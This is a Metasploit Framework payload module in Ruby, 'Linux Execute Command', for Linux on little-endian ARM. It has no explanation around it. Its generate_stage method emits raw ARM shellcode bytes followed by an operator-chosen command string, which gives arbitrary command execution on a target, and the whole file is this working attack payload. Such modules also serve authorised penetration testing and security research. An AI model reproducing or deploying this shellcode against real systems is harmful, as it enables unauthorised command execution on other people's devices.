##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# Exec
# ----
#
# Executes an arbitrary command.
#
###
module MetasploitModule

  CachedSize = 29

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Execute Command',
      'Description'   => 'Execute an arbitrary command',
      'Author'        => 'Jonathan Salwan',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_ARMLE))

    register_options(
      [
        OptString.new('CMD',  [ true,  "The command string to execute" ]),
      ])
  end

  def generate_stage(opts={})
    cmd     = datastore['CMD'] || ''

    payload =
      "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0a\x30" +
      "\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf" + cmd

  end
end
